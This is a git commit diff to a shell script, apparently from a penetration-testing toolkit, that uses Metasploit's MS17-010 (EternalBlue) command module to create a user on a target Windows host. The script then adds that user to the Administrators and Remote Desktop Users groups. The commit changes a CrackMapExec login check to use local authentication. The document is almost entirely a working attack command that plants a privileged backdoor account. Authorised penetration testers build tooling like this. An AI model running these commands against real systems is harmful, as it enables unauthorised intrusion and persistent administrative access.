b555f9e17652c92bdfb419d324c0e010bf9196c8
kernsm-bsi <139244341+kernsm-bsi@users.noreply.github.com>
2024-01-09 23:48:06 -0500

    Update ms17-010-add-user.sh

--- modules/ms17-010-add-user.sh
+++ modules/ms17-010-add-user.sh
@@ -11,4 +11,4 @@
 msfconsole -q -x "use auxiliary/admin/smb/ms17_010_command; set RHOSTS $1; set RPORT 445; set COMMAND net user $2 $3 /add; run; set COMMAND net localgroup administrators $2 /add; run; set COMMAND net localgroup "Remote Desktop Users" $2 /add ; run; exit" | sed 's/\x1b\[[0-9;]*m//g'
 
 # Check access with CME
-crackmapexec smb $1 -u $2 -p $3
+crackmapexec smb $1 -u $2 -p $3 --local-auth
